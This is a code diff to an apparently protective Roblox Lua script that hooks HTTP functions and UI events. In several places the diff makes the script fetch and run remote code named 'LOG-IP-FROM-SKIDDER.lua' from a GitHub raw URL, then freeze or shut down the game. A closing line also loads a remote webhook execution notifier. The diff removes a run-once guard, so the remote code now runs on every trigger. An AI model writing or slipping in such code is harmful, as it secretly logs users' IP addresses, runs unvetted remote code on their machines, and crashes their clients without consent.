@@ -1,7 +1,7 @@
-local IpGrabbed = false
+
 if not HttpsProtect then
 	HttpsProtect = {
-		"Yo Mama You Are Fat!!!1!1!"
+		"👽👽👽👽👽👽"
 	}
 end
 local OrginalHttps = {
@@ -31,10 +31,7 @@ for _, func in next, functions do
                 for _, arg in next, args do
                     for _, url in ipairs(OrginalHttps) do
                         if tostring(arg):find(url) then
-	                        if not IpGrabbed then
-		                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-								IpGrabbed = true 
-							end
+	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
 	                        while true do end
                             return 
                         end
@@ -56,10 +53,7 @@ for _, func in next, functions do
                 for _, arg in next, args do
                     for _, url in ipairs(HttpsProtect) do
                         if tostring(arg):find(url) then
-	                        if not IpGrabbed then
-		                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-								IpGrabbed = true 
-							end
+	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
 	                        while true do end
                             return 
                         end
@@ -80,10 +74,8 @@ setmetatable(
     {
         __newindex = function(t, i, v)
             if tostring(i) == "ID" then
-	            if not IpGrabbed then
-                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-					IpGrabbed = true 
-				end
+	            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+				game:Shutdown()
                 while true do end return 
             end
         end
@@ -98,11 +90,9 @@ local function checkDescendant(descendant)
         for _, name in ipairs(OrginalHttps) do
 	        spawn(function ()
 	            if string.find(descendant.Text, name) or descendant.Name == name then
-					if not IpGrabbed then
-	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-						IpGrabbed = true 
-					end
 					descendant:Destroy()
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+					game:Shutdown()
 	                while true do end return 
 	            end
 			end)
@@ -110,11 +100,9 @@ local function checkDescendant(descendant)
         for _, name in ipairs(HttpsProtect) do
 	        spawn(function()
 	            if string.find(descendant.Text, name) or descendant.Name == name then
-					if not IpGrabbed then
-	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-						IpGrabbed = true 
-					end
 					descendant:Destroy()
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+					game:Shutdown()
 	                while true do end return 
 	            end
 	        end)
@@ -127,3 +115,4 @@ coreGui.DescendantAdded:Connect(checkDescendant)
 
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/Webhook-Execution-Notification'),true))()
+
